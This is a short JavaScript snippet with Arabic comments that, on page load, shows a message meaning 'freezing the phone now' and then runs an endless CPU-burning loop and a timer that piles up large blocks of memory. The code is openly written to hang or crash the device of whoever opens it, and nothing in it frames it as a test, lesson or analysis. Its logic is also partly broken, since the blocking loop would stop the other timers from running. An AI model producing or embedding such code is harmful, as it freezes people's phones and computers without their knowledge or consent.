window.onload = function() {
    // عرض الرسالة فور فتح التطبيق
    document.getElementById('status').innerText = "جاري تهنيج الهاتف الآن...";

    // استهلاك المعالج بشكل مستمر
    let x = 0;
    setInterval(function() {
        while (true) {
            x++; // عملية غير منتهية تستهلك المعالج
        }
    }, 1);

    // استهلاك الذاكرة بشكل مستمر
    let memoryArray = [];
    setInterval(function () {
        memoryArray.push(new Array(10 ** 7).join('0'));  // إضافة بيانات ضخمة (ما يعادل 10MB) إلى الذاكرة
    }, 10);  // إضافة بيانات كل 10ms

    // إضافة بعض التأثيرات الجمالية لزيادة الانطباع
    let counter = 0;
    setInterval(function () {
        counter++;
        document.getElementById('status').innerText = `جاري تهنيج الهاتف الآن... (تحديث ${counter})`;
    }, 500);
};